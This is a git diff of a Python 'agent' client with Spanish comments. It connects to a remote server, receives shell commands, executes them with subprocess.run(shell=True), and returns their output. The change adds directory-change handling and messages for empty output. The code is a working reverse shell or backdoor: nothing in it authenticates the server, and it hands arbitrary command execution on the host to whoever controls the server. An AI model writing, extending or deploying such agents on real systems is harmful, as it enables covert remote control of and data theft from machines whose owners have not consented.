@@ -82,19 +82,43 @@ def connect_to_server():
     if agent_id is None:
         print("Error: No se encontró el ID del agente. Regístrate primero.")
         return  
+
     try:
         agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         agent_socket.connect((server_host, server_port))
         print(f"Agente {agent_id} conectado al servidor.")
-        agent_socket.send(str(agent_id).encode('utf-8')) # Enviar el agent_id al servidor al conectar
+        
+        # Enviar el ID del agente al servidor
+        agent_socket.send(str(agent_id).encode('utf-8'))
+
         while True:
             command = agent_socket.recv(1024).decode('utf-8')
-            print(command)
             if command.lower() == "exit":
                 break
             if command:
-                result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                output = result.stdout if result.stdout else result.stderr
+                if command.split(" ")[0] == 'cd':
+                    # Cambiar de directorio de trabajo
+                    try:
+                        os.chdir(" ".join(command.split(" ")[1:]))
+                        output = "Ruta actual: {}".format(os.getcwd())
+                    except FileNotFoundError:
+                        output = "Error: Directorio no encontrado."
+                    except Exception as e:
+                        output = f"Error al cambiar de directorio: {e}"
+                else:
+                    # Ejecutar el comando y obtener el resultado
+                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+
+                    # Si el comando produjo salida, enviarla
+                    if result.stdout:
+                        output = result.stdout
+                    # Si el comando produjo error, enviarlo
+                    elif result.stderr:
+                        output = result.stderr
+                    else:
+                        # Si no hubo salida ni error, enviar un mensaje indicando que no hubo salida
+                        output = "Comando ejecutado sin salida."
+
                 agent_socket.send(output.encode('utf-8'))
         agent_socket.close()
     except Exception as e:
